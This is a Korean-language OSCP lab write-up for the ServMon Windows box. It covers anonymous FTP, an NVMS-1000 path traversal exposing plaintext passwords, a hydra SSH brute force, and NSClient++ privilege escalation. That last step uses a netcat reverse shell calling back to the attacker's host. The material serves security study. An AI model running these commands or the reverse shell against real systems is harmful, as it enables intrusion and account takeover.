---
slug: "servmon"
title: "servMon"
date: 2026-07-10
category: "windows"
section: "OSCP"
group: "01_boxes"
tags: []
excerpt: "/Users로 들어가 보니 `Nadine`과 `Nathan` 이라는 유저가 있고 각각 아래와 같은 내용으로 이뤄짐 ```sh #/Nadine/Confidential.txt…"
readingTime: 7
---

#### Box: 이름 |  Windows | Easy
날짜:
소요시간: 4시간 ++

##### Open Ports
**21 ftp**
22 ssh
80 http
135 msrpc
139 netbios-ssn
445 microsoft-ds?
5666 tcpwrapped
6699 napster?
8443 ssl

##### Interesting Services
**ftp anonymous**가 열려있음
~~~sh
ftp 10.129.3.43                       
> Name (10.129.3.43:kali): anonymous 
> Password: anonymous

#ftp 문법
ls
cd /Users
get <파일명>
~~~

/Users로 들어가 보니 `Nadine`과 `Nathan` 이라는 유저가 있고
각각 아래와 같은 내용으로 이뤄짐
```sh
#/Nadine/Confidential.txt
Nathan,
I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
Regards
Nadine

#/Nathan/'Notes to do.txt'
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
-> Nathan의 desktop 디렉토리에 Passwords.txt를 넣어 놨다라는걸 알 수 있음
##### Initial Foothold
벡터: NVMS-1000 Path Traversal → Credential Reuse
명령어:
80포트에 NVMS-1000이라는 서비스가 떠있음
![](assets/images/posts/Pasted%20image%2020260710215301.png)
~~~sh
searchsploit -m hardware/webapps/47774.txt

#아래와 같이 입력하면 된다고 함
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
~~~
![](assets/images/posts/Pasted%20image%2020260710215456.png)
그럼 앞서 나온 password 파일이 있을 법한 %2FUsers%2FNathan%2FDesktop%2FPasswords.txt 로 들어가면
```sh
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$

# -> 얘네를 따로 저장 해줌 (passwd.txt)
```
다음과 같은 문자열 들이나오니

처음 써보는 hydra로 burteforce 써보자
```sh
hydra -l Nadine -P ./passwd.txt 10.129.3.43 ssh
```
-> 놀랍게도 Nathan이 아니라 nadine으로 검색해야 나옴
```sh
sshpass -p L1k3B1gBut7s@W0rk ssh Nadine@10.129.3.43

type C:\Users\Nadine\Desktop\user.txt
```
**user.txt**: 2ba0f71119d27ce1c636c1dc9517195f



##### Privilege Escalation(Nadine -> administor)
벡터: NSClient++ Scheduled Script Execution (Local System)
명령어:
위에 Nathan의 메모를 보면 아래와 같이 적혀 있음
```sh
Lock down the NSClient Access - Complete

#여기로 접속해보면 NSClient가 나옴
https://10.129.3.43:8443/index.html
```
 ![](assets/images/posts/Pasted%20image%2020260710223339.png)
마침 여기도 취약점이 있다고 해서 46802.txt를 읽고 따라하는 걸로
```sh
searchsploit -m windows/local/46802.txt

cat 46802.txt
# Prerequisites: To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.
```
-> 성공적으로 이 취약점을 실행시키려면 로컬로써 접근을 해야한다고 함

```sh
#일단 비밀번호 확인
cd C:\Program Files\NSClient++

nscp web -- password --display
#-> ew2x6SsGTxjRwXOT

#로컬로 접속을 위한 ssh 터널링
ssh -L 8443:127.0.0.1:8443 Nadine@10.129.3.43

#여기로 접속 https 반드시 붙여야함 !!
-> https://127.0.0.1:8443/index.html
```
-> settings로 들어가 위에 크레덴셜로 로그인 해주고
~~~sh
#kali에서 
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
echo "C:\Shared\nc64.exe -e cmd.exe 10.10.14.28 5555" > shell.bat
python3 -m http.server 8000

#Nadine 쉘에서
cd C:\Shared
powershell wget http://<ip>:8000/nc64.exe
powershell wget http://<ip>:8000/shell.bat
~~~
-> /settings/external scripts/scripts/foobar 여기에 command = C:\Shared\shell.bat
-> /settings/scheduler/schedules/foobar 여기에 
	- command = foobar
	- interval = 10s
이렇게 추가해주고 Restart 눌러줌

```sh
nc -nlvp 5555
```
-> 하루 죙일 기다리면 admin shell 획득
**root.txt:** 1cc37150fa36caec7c62994e9aba7a96

##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
- ftp 사용법
- 안에 있는 단서들로 탐정놀이 하기
- Path Traversal → Credential Reuse
- searchsploit 사용법
- hydra 사용법

얘네 다 넣어야 될듯?